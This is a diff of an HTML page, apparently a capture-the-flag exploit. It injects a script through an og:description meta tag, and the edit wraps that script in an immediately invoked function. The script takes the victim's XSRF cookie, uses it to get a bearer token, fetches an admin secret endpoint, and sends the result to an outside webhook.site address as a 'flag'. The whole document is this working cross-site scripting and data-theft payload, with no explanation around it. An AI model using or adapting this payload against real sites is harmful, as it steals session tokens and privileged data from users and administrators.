@@ -1,23 +1,25 @@
 <!DOCTYPE html>
 <head>
   <meta property="og:description" content='<script>
-const u = "https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d";
-const c = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
-if (!c) return;
+(() => {
+  const u = "https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d";
+  const c = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
+  if (!c) return;
 
-fetch("/generate-token", {
-  method: "POST",
-  headers: { "X-XSRF-TOKEN": decodeURIComponent(c[1]) },
-  credentials: "include"
-})
-.then(r => r.json())
-.then(j => fetch("/api/admin/sup3rs3cr3t", {
-  headers: { "Authorization": "Bearer " + j.token },
-  credentials: "include"
-}))
-.then(r => r.text())
-.then(f => new Image().src = u + "?flag=" + encodeURIComponent(f))
-.catch(e => new Image().src = u + "?err=" + encodeURIComponent(e.message));
+  fetch("/generate-token", {
+    method: "POST",
+    headers: { "X-XSRF-TOKEN": decodeURIComponent(c[1]) },
+    credentials: "include"
+  })
+  .then(r => r.json())
+  .then(j => fetch("/api/admin/sup3rs3cr3t", {
+    headers: { "Authorization": "Bearer " + j.token },
+    credentials: "include"
+  }))
+  .then(r => r.text())
+  .then(f => new Image().src = u + "?flag=" + encodeURIComponent(f))
+  .catch(e => new Image().src = u + "?err=" + encodeURIComponent(e.message));
+})();
 </script>' />
 </head>
 <body><h1>Hello</h1></body>
